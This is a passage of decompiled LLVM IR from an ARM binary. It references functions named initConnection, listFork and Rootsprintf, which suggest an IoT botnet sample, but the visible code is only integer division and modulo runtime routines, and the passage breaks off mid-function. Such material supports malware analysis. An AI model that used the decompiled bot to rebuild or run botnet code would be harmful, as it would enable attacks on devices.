  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_ef70, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_ef38, { 1, 2, 0 }
  uselistorder i32 %v2_eeb0, { 1, 2, 0 }
  uselistorder i8* %v5_ee68, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_ee64, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_ed9c, { 1, 2, 0 }
  uselistorder i1 %v9_ecb4, { 1, 0 }
  uselistorder i32 %v3_ecc8, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_ec00, { 1, 0 }
  uselistorder i32 %v3_ec34, { 1, 2, 0, 3 }
  uselistorder i32 %v3_eba8, { 1, 0 }
  uselistorder i32 %v1_eb8c, { 1, 0 }
  uselistorder i32 %v5_ead0, { 1, 0 }
  uselistorder i32 %v1_ea60, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_efbc, { 2, 4, 3, 5, 1, 0 }
  uselistorder i8* %v4_f264, { 3, 0, 1, 2 }
  uselistorder i32 %v2_f254, { 8, 2, 4, 3, 6, 5, 7, 0, 1 }
  uselistorder i32 %v3_e8c8, { 1, 0, 2 }
  uselistorder i32 %v2_e82c, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19a88.577 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_23b30.67, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_29db4.70, { 0, 2, 3, 4, 5, 6, 7, 1, 8, 9 }
  uselistorder i32 (i32, i32)* @Rootsprintf, { 15, 14, 1, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 16, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32* @global_var_29da8.81, { 0, 2, 1 }
  uselistorder i32* @global_var_23b28.49, { 2, 3, 4, 5, 0, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 2, 1, 4, 3, 0 }
  uselistorder [2 x i8]* @global_var_199ac.546, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_199ac.546 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @srand, { 0, 2, 1 }
  uselistorder i32 (i32*)* @__GI_time, { 20, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 1, 2, 3, 4, 5, 6, 18, 19 }
  uselistorder label %dec_label_pc_f244.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_f200, { 1, 0 }
  uselistorder label %dec_label_pc_f1b0, { 1, 0 }
  uselistorder label %dec_label_pc_f0d8, { 1, 0 }
  uselistorder label %dec_label_pc_f0ac, { 1, 0 }
  uselistorder label %dec_label_pc_f074, { 1, 0 }
  uselistorder label %dec_label_pc_ef4c, { 1, 0 }
  uselistorder label %dec_label_pc_ef28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ef18, { 1, 0 }
  uselistorder label %dec_label_pc_ee98, { 1, 0 }
  uselistorder label %dec_label_pc_ee00, { 1, 0 }
  uselistorder label %dec_label_pc_edc4, { 1, 0 }
  uselistorder label %dec_label_pc_ecec, { 1, 0 }
  uselistorder label %dec_label_pc_ec74, { 1, 0 }
  uselistorder label %dec_label_pc_ebe4, { 1, 0 }
  uselistorder label %dec_label_pc_eab4, { 1, 0 }
  uselistorder label %dec_label_pc_e9c8, { 1, 0 }
  uselistorder label %dec_label_pc_e9b8.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e99c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e910, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_e7e8, { 1, 0 }
  uselistorder label %dec_label_pc_e774, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_f2d4 = add i32 %arg2, -1
  %v7_f2d4 = icmp eq i32 %arg2, 1
  br i1 %v7_f2d4, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_f2d8 = load i32, i32* @r0, align 4
  ret i32 %v2_f2d8

bb80:                                             ; preds = %entry
  %v2_f2d4 = icmp eq i32 %arg2, 0
  br i1 %v2_f2d4, label %dec_label_pc_f3bc, label %dec_label_pc_f2e0

dec_label_pc_f2e0:                                ; preds = %bb80
  %v0_f2e0 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_f2e0, %arg2
  br i1 %tmp, label %dec_label_pc_f2e8, label %dec_label_pc_f374

dec_label_pc_f2e8:                                ; preds = %dec_label_pc_f2e0
  %v2_f2e8 = and i32 %v1_f2d4, %arg2
  %v4_f2e8 = icmp eq i32 %v2_f2e8, 0
  br i1 %v4_f2e8, label %dec_label_pc_f380, label %dec_label_pc_f2f0

dec_label_pc_f2f0:                                ; preds = %dec_label_pc_f2e8
  %v3_f2f0 = icmp ult i32 %arg2, 536870912
  br i1 %v3_f2f0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_f2f0
  %v4_f2f4 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_f2f0, %.thread
  %v0_f314.pr36.ph = phi i32 [ %v4_f2f4, %.thread ], [ %arg2, %dec_label_pc_f2f0 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_f2f0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_f314.pr36 = phi i32 [ %v4_f308, %bb83 ], [ %v0_f314.pr36.ph, %.preheader.preheader ]
  %v1_f30c = phi i32 [ %v4_f30c, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_f300 = icmp ugt i32 %v0_f314.pr36, 268435455
  br i1 %v2_f300, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_f314thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_f304 = icmp ult i32 %v0_f314.pr36, %v0_f2e0
  br i1 %v4_f304, label %bb82, label %dec_label_pc_f314thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_f308 = and i32 %v0_f314.pr36, 268435456
  %v3_f308 = icmp eq i32 %v2_f308, 0
  %v4_f308 = mul i32 %v0_f314.pr36, 16
  br i1 %v3_f308, label %bb83, label %dec_label_pc_f314.loopexit

bb83:                                             ; preds = %bb82
  %v2_f30c = and i32 %v1_f30c, 268435456
  %v3_f30c = icmp eq i32 %v2_f30c, 0
  %v4_f30c = mul i32 %v1_f30c, 16
  br i1 %v3_f30c, label %.preheader, label %dec_label_pc_f314thread-pre-split.loopexit.loopexit

dec_label_pc_f314thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_f32048.ph = phi i32 [ %v1_f30c, %bb81 ], [ %v4_f30c, %bb83 ]
  %v0_f314.pr38.ph = phi i32 [ %v0_f314.pr36, %bb81 ], [ %v4_f308, %bb83 ]
  br label %dec_label_pc_f314thread-pre-split.loopexit

dec_label_pc_f314thread-pre-split.loopexit:       ; preds = %dec_label_pc_f314thread-pre-split.loopexit.loopexit, %.thread2
  %v1_f32048 = phi i32 [ %v1_f30c, %.thread2 ], [ %v1_f32048.ph, %dec_label_pc_f314thread-pre-split.loopexit.loopexit ]
  %v0_f314.pr38 = phi i32 [ %v0_f314.pr36, %.thread2 ], [ %v0_f314.pr38.ph, %dec_label_pc_f314thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f314thread-pre-split

dec_label_pc_f314thread-pre-split:                ; preds = %dec_label_pc_f314thread-pre-split.loopexit, %bb85
  %v1_f32046 = phi i32 [ %v1_f32048, %dec_label_pc_f314thread-pre-split.loopexit ], [ %v3_f320, %bb85 ]
  %v0_f314.pr = phi i32 [ %v0_f314.pr38, %dec_label_pc_f314thread-pre-split.loopexit ], [ %v3_f31c, %bb85 ]
  br label %dec_label_pc_f314

dec_label_pc_f314.loopexit:                       ; preds = %bb82
  br label %dec_label_pc_f314

dec_label_pc_f314:                                ; preds = %dec_label_pc_f314.loopexit, %dec_label_pc_f314thread-pre-split
  %v1_f320 = phi i32 [ %v1_f32046, %dec_label_pc_f314thread-pre-split ], [ %v1_f30c, %dec_label_pc_f314.loopexit ]
  %v1_f31c = phi i32 [ %v0_f314.pr, %dec_label_pc_f314thread-pre-split ], [ %v4_f308, %dec_label_pc_f314.loopexit ]
  %v2_f314 = icmp slt i32 %v1_f31c, 0
  br i1 %v2_f314, label %dec_label_pc_f328, label %bb84

bb84:                                             ; preds = %dec_label_pc_f314
  %v4_f318 = icmp ult i32 %v1_f31c, %v0_f2e0
  br i1 %v4_f318, label %bb85, label %dec_label_pc_f328

bb85:                                             ; preds = %bb84
  %v3_f31c = mul i32 %v1_f31c, 2
  %v2_f320 = icmp slt i32 %v1_f320, 0
  %v3_f320 = mul i32 %v1_f320, 2
  br i1 %v2_f320, label %dec_label_pc_f328, label %dec_label_pc_f314thread-pre-split

dec_label_pc_f328:                                ; preds = %bb84, %dec_label_pc_f314, %bb85
  %v2_f33459 = phi i32 [ %v3_f320, %bb85 ], [ %v1_f320, %bb84 ], [ %v1_f320, %dec_label_pc_f314 ]
  %v1_f32c51 = phi i32 [ %v3_f31c, %bb85 ], [ %v1_f31c, %bb84 ], [ %v1_f31c, %dec_label_pc_f314 ]
  br label %dec_label_pc_f32c

dec_label_pc_f32c:                                ; preds = %.thread11, %dec_label_pc_f328
  %v1_f360 = phi i32 [ %v4_f360, %.thread11 ], [ %v2_f33459, %dec_label_pc_f328 ]
  %v1_f334 = phi i32 [ %v0_f36c, %.thread11 ], [ 0, %dec_label_pc_f328 ]
  %v1_f364 = phi i32 [ %v4_f364, %.thread11 ], [ %v1_f32c51, %dec_label_pc_f328 ]
  %v1_f330 = phi i32 [ %v0_f35c, %.thread11 ], [ %v0_f2e0, %dec_label_pc_f328 ]
  %v3_f32c = icmp ult i32 %v1_f330, %v1_f364
  br i1 %v3_f32c, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_f32c
  %v3_f330 = sub i32 %v1_f330, %v1_f364
  %v3_f334 = or i32 %v1_f334, %v1_f360
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_f32c, %bb86
  %v1_f33c = phi i32 [ %v1_f330, %dec_label_pc_f32c ], [ %v3_f330, %bb86 ]
  %v1_f340 = phi i32 [ %v1_f334, %dec_label_pc_f32c ], [ %v3_f334, %bb86 ]
  %v4_f338 = udiv i32 %v1_f364, 2
  %v6_f338 = icmp ult i32 %v1_f33c, %v4_f338
  br i1 %v6_f338, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_f33c = urem i32 %v1_f364, 2
  %v4_f33c = icmp eq i32 %v3_f33c, 0
  %v6_f33c = sub i32 %v1_f33c, %v4_f338
  br i1 %v4_f33c, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_f340 = udiv i32 %v1_f360, 2
  %v6_f340 = or i32 %v1_f340, %v5_f340
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_f348 = phi i32 [ %v6_f33c, %bb87 ], [ %v1_f33c, %.thread7 ], [ %v6_f33c, %bb88 ]
  %v1_f34c = phi i32 [ %v1_f340, %bb87 ], [ %v1_f340, %.thread7 ], [ %v6_f340, %bb88 ]
  %v4_f344 = udiv i32 %v1_f364, 4
  %v6_f344 = icmp ult i32 %v1_f348, %v4_f344
  br i1 %v6_f344, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_f348 = and i32 %v1_f364, 2
  %v4_f348 = icmp eq i32 %v3_f348, 0
  %v6_f348 = sub i32 %v1_f348, %v4_f344
  br i1 %v4_f348, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_f34c = udiv i32 %v1_f360, 4
  %v6_f34c = or i32 %v1_f34c, %v5_f34c
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_f354 = phi i32 [ %v6_f348, %bb89 ], [ %v1_f348, %.thread8 ], [ %v6_f348, %bb90 ]
  %v1_f358 = phi i32 [ %v1_f34c, %bb89 ], [ %v1_f34c, %.thread8 ], [ %v6_f34c, %bb90 ]
  %v4_f350 = udiv i32 %v1_f364, 8
  %v6_f350 = icmp ult i32 %v1_f354, %v4_f350
  br i1 %v6_f350, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_f354 = and i32 %v1_f364, 4
  %v4_f354 = icmp eq i32 %v3_f354, 0
  %v6_f354 = sub i32 %v1_f354, %v4_f350
  br i1 %v4_f354, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_f358 = udiv i32 %v1_f360, 8
  %v6_f358 = or i32 %v1_f358, %v5_f358
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_f36c = phi i32 [ %v1_f358, %bb91 ], [ %v1_f358, %.thread9 ], [ %v6_f358, %bb92 ]
  %v0_f35c = phi i32 [ %v6_f354, %bb91 ], [ %v1_f354, %.thread9 ], [ %v6_f354, %bb92 ]
  %v2_f35c = icmp eq i32 %v0_f35c, 0
  br i1 %v2_f35c, label %dec_label_pc_f36c, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_f360, 16
  br i1 %tmp140, label %dec_label_pc_f36c, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_f360 = udiv i32 %v1_f360, 16
  %v4_f364 = udiv i32 %v1_f364, 16
  br label %dec_label_pc_f32c

dec_label_pc_f36c:                                ; preds = %thread-pre-split, %bb93
  ret i32 %v0_f36c

dec_label_pc_f374:                                ; preds = %dec_label_pc_f2e0
  %v9_f2e0 = icmp eq i32 %v0_f2e0, %arg2
  %. = zext i1 %v9_f2e0 to i32
  ret i32 %.

dec_label_pc_f380:                                ; preds = %dec_label_pc_f2e8
  %v2_f380 = icmp ugt i32 %arg2, 65535
  br i1 %v2_f380, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_f380
  %v2_f384 = and i32 %arg2, 32768
  %v3_f384 = icmp eq i32 %v2_f384, 0
  %v4_f384 = udiv i32 %arg2, 65536
  br i1 %v3_f384, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_f380
  %v0_f39065 = phi i32 [ %arg2, %dec_label_pc_f380 ], [ %v4_f384, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_f394 = phi i32 [ %v0_f39065, %.thread16 ], [ %v4_f384, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_f390 = icmp ugt i32 %v1_f394, 255
  br i1 %v2_f390, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_f394 = and i32 %v1_f394, 128
  %v3_f394 = icmp eq i32 %v2_f394, 0
  %v4_f394 = udiv i32 %v1_f394, 256
  br i1 %v3_f394, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_f398 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_f3a4 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_f398, %bb100 ]
  %v1_f3a0 = phi i32 [ %v1_f394, %bb98 ], [ %v4_f394, %bb99 ], [ %v4_f394, %bb100 ]
  %v2_f39c = icmp ugt i32 %v1_f3a0, 15
  br i1 %v2_f39c, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_f3a0 = and i32 %v1_f3a0, 8
  %v3_f3a0 = icmp eq i32 %v2_f3a0, 0
  %v4_f3a0 = udiv i32 %v1_f3a0, 16
  br i1 %v3_f3a0, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_f3a4 = add nsw i32 %v1_f3a4, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_f3ac = phi i32 [ %v1_f3a4, %.thread17 ], [ %v1_f3a4, %bb101 ], [ %v2_f3a4, %bb102 ]
  %v5_f3b0 = phi i32 [ %v1_f3a0, %.thread17 ], [ %v4_f3a0, %bb101 ], [ %v4_f3a0, %bb102 ]
  %v2_f3a8 = icmp ugt i32 %v5_f3b0, 3
  %v7_f3a8 = icmp eq i32 %v5_f3b0, 4
  %v2_f3ac = xor i1 %v7_f3a8, true
  %v3_f3ac = and i1 %v2_f3a8, %v2_f3ac
  br i1 %v3_f3ac, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_f3ac = add nsw i32 %v4_f3ac, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_f3b0 = phi i32 [ %v4_f3ac, %.thread18 ], [ %v5_f3ac, %bb103 ]
  %v2_f3b0 = xor i1 %v2_f3a8, true
  %v3_f3b0 = or i1 %v7_f3a8, %v2_f3b0
  br i1 %v3_f3b0, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_f3b0 = udiv i32 %v5_f3b0, 2
  %v9_f3b0 = add i32 %v4_f3b0, %v8_f3b0
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_f3b4 = phi i32 [ %v4_f3b0, %bb104 ], [ %v9_f3b0, %bb105 ]
  %v6_f3b4 = lshr i32 %v0_f2e0, %v1_f3b4
  ret i32 %v6_f3b4

dec_label_pc_f3bc:                                ; preds = %bb80
  %v0_f3bc = load i32, i32* @lr, align 4
  %v0_f3c0 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_f3bc)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_f3b0, { 1, 0 }
  uselistorder i1 %v7_f3a8, { 1, 0 }
  uselistorder i32 %v4_f3a0, { 1, 0 }
  uselistorder i32 %v1_f3a0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_f394, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_f394, { 1, 0, 2, 3 }
  uselistorder i32 %v4_f384, { 1, 0 }
  uselistorder i32 %v0_f35c, { 1, 0 }
  uselistorder i32 %v4_f350, { 1, 0 }
  uselistorder i32 %v1_f358, { 1, 2, 0 }
  uselistorder i32 %v4_f344, { 1, 0 }
  uselistorder i32 %v1_f34c, { 1, 2, 0 }
  uselistorder i32 %v4_f338, { 1, 0 }
  uselistorder i32 %v1_f340, { 1, 2, 0 }
  uselistorder i32 %v1_f364, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_f334, { 1, 0 }
  uselistorder i32 %v1_f360, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_f320, { 1, 0 }
  uselistorder i32 %v3_f31c, { 1, 0 }
  uselistorder i32 %v1_f31c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_f320, { 1, 2, 0, 3 }
  uselistorder i32 %v4_f30c, { 1, 0 }
  uselistorder i32 %v4_f308, { 2, 1, 0 }
  uselistorder i32 %v1_f30c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_f314.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_f2e0, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_f36c, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_f328, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f314thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_f3d0 = udiv i32 %arg1, %arg2
  ret i32 %v2_f3d0
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_f3e4 = add i32 %arg2, -1
  %v2_f3e4 = icmp eq i32 %arg2, 0
  br i1 %v2_f3e4, label %dec_label_pc_f4a0, label %dec_label_pc_f3ec

dec_label_pc_f3ec:                                ; preds = %entry
  %v7_f3e4 = icmp eq i32 %arg2, 1
  br i1 %v7_f3e4, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_f3ec
  %v1_f3ec = load i32, i32* @r0, align 4
  %v10_f3ec = icmp eq i32 %v1_f3ec, %arg2
  br i1 %v10_f3ec, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_f3ec, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_f3ec = icmp ult i32 %v1_f3ec, %arg2
  br i1 %v4_f3ec, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_f3f4 = and i32 %v1_f3e4, %arg2
  %v8_f3f4 = icmp eq i32 %v6_f3f4, 0
  br i1 %v8_f3f4, label %.thread67, label %dec_label_pc_f404.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_f3f8 = phi i32 [ %v1_f3ec, %bb75 ], [ 0, %.thread65 ]
  %v3_f3f8 = and i32 %v1_f3f8, %v1_f3e4
  br label %bb76

dec_label_pc_f404.preheader:                      ; preds = %bb75
  %v2_f40499 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_f40499, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_f494, %bb74, %bb89, %bb84, %dec_label_pc_f464, %.thread67
  %v5_f3fc = phi i32 [ %v1_f3ec, %bb74 ], [ %v3_f3f8, %.thread67 ], [ %v1_f440.v6_f440.v6_f448.v6_f450, %dec_label_pc_f464 ], [ 0, %bb84 ], [ %v1_f498, %dec_label_pc_f494 ], [ %v2_f494, %bb89 ]
  ret i32 %v5_f3fc

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_f404.preheader
  %v0_f418.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_f404.preheader ], [ %v4_f40c, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_f404.preheader ], [ %v2_f41011, %.thread1.thread9 ]
  br label %dec_label_pc_f418thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_f404.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_f41011, %.thread1.thread9 ], [ 0, %dec_label_pc_f404.preheader ]
  %v0_f418.pr33100 = phi i32 [ %v4_f40c, %.thread1.thread9 ], [ %arg2, %dec_label_pc_f404.preheader ]
  %v4_f408 = icmp ult i32 %v0_f418.pr33100, %v1_f3ec
  br i1 %v4_f408, label %bb78, label %dec_label_pc_f418thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_f40c = and i32 %v0_f418.pr33100, 268435456
  %v3_f40c = icmp eq i32 %v2_f40c, 0
  %v4_f40c = mul i32 %v0_f418.pr33100, 16
  br i1 %v3_f40c, label %.thread1.thread9, label %dec_label_pc_f418.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_f41011 = add i32 %storemerge101, 4
  %v2_f404 = icmp ugt i32 %v4_f40c, 268435455
  br i1 %v2_f404, label %.thread, label %bb77

dec_label_pc_f418thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_f418thread-pre-split.loopexit

dec_label_pc_f418thread-pre-split.loopexit:       ; preds = %dec_label_pc_f418thread-pre-split.loopexit.loopexit, %.thread
  %v0_f418.pr3398 = phi i32 [ %v0_f418.pr33.lcssa, %.thread ], [ %v0_f418.pr33100, %dec_label_pc_f418thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_f418thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f418thread-pre-split

dec_label_pc_f418thread-pre-split:                ; preds = %.thread4, %dec_label_pc_f418thread-pre-split.loopexit
  %v1_f42439 = phi i32 [ %storemerge95, %dec_label_pc_f418thread-pre-split.loopexit ], [ %v2_f424, %.thread4 ]
  %v0_f418.pr = phi i32 [ %v0_f418.pr3398, %dec_label_pc_f418thread-pre-split.loopexit ], [ %v3_f420, %.thread4 ]
  br label %dec_label_pc_f418

dec_label_pc_f418.loopexit:                       ; preds = %bb78
  br label %dec_label_pc_f418

dec_label_pc_f418:                                ; preds = %dec_label_pc_f418.loopexit, %dec_label_pc_f418thread-pre-split
  %v0_f42c.pr = phi i32 [ %v1_f42439, %dec_label_pc_f418thread-pre-split ], [ %storemerge101, %dec_label_pc_f418.loopexit ]
  %v1_f420 = phi i32 [ %v0_f418.pr, %dec_label_pc_f418thread-pre-split ], [ %v4_f40c, %dec_label_pc_f418.loopexit ]
  %v2_f418 = icmp slt i32 %v1_f420, 0
  br i1 %v2_f418, label %dec_label_pc_f42c, label %bb79

bb79:                                             ; preds = %dec_label_pc_f418
  %v4_f41c = icmp ult i32 %v1_f420, %v1_f3ec
  br i1 %v4_f41c, label %.thread4, label %dec_label_pc_f42c

.thread4:                                         ; preds = %bb79
  %v3_f420 = mul i32 %v1_f420, 2
  %v2_f424 = add i32 %v0_f42c.pr, 1
  br label %dec_label_pc_f418thread-pre-split

dec_label_pc_f42c:                                ; preds = %bb79, %dec_label_pc_f418
  %v2_f42c = add i32 %v0_f42c.pr, -3
  %v5_f430 = icmp slt i32 %v0_f42c.pr, 3
  br i1 %v5_f430, label %dec_label_pc_f470, label %dec_label_pc_f434

dec_label_pc_f434:                                ; preds = %dec_label_pc_f42c, %bb83
  %v6_f45c = phi i32 [ %v0_f464, %bb83 ], [ %v2_f42c, %dec_label_pc_f42c ]
  %v1_f438 = phi i32 [ %v1_f440.v6_f440.v6_f448.v6_f450, %bb83 ], [ %v1_f3ec, %dec_label_pc_f42c ]
  %v3_f45812 = phi i32 [ %v3_f458, %bb83 ], [ %v1_f420, %dec_label_pc_f42c ]
  %v3_f434 = icmp ult i32 %v1_f438, %v3_f45812
  %v3_f438 = select i1 %v3_f434, i32 0, i32 %v3_f45812
  %v1_f440 = sub i32 %v1_f438, %v3_f438
  %v4_f43c = udiv i32 %v3_f45812, 2
  %v6_f43c = icmp ult i32 %v1_f440, %v4_f43c
  %v6_f440 = select i1 %v6_f43c, i32 0, i32 %v4_f43c
  %v1_f440.v6_f440 = sub i32 %v1_f440, %v6_f440
  %.demorgan = and i1 %v3_f434, %v6_f43c
  %v4_f444 = udiv i32 %v3_f45812, 4
  %v6_f444 = icmp ult i32 %v1_f440.v6_f440, %v4_f444
  %v6_f448 = select i1 %v6_f444, i32 0, i32 %v4_f444
  %v1_f440.v6_f440.v6_f448 = sub i32 %v1_f440.v6_f440, %v6_f448
  %.demorgan71 = and i1 %.demorgan, %v6_f444
  %v4_f44c = udiv i32 %v3_f45812, 8
  %v6_f44c = icmp ult i32 %v1_f440.v6_f440.v6_f448, %v4_f44c
  %v6_f450 = select i1 %v6_f44c, i32 0, i32 %v4_f44c
  %v1_f440.v6_f440.v6_f448.v6_f450 = sub i32 %v1_f440.v6_f440.v6_f448, %v6_f450
  %.demorgan72 = and i1 %.demorgan71, %v6_f44c
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_f434
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_f434, %bb80
  %v2_f454 = add i32 %v1_f440.v6_f440.v6_f448.v6_f450, -1
  %v4_f454 = sub i32 0, %v1_f440.v6_f440.v6_f448.v6_f450
  %v5_f454 = and i32 %v1_f440.v6_f440.v6_f448.v6_f450, %v4_f454
  %v3_f458 = udiv i32 %v3_f45812, 16
  %v5_f45c = icmp slt i32 %v1_f440.v6_f440.v6_f448.v6_f450, 1
  br i1 %v5_f45c, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_f45c = add i32 %v6_f45c, -4
  %v9_f45c = sub i32 3, %v6_f45c
  %v10_f45c = and i32 %v9_f45c, %v6_f45c
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_f464 = phi i32 [ %v6_f45c, %bb81 ], [ %v7_f45c, %bb82 ]
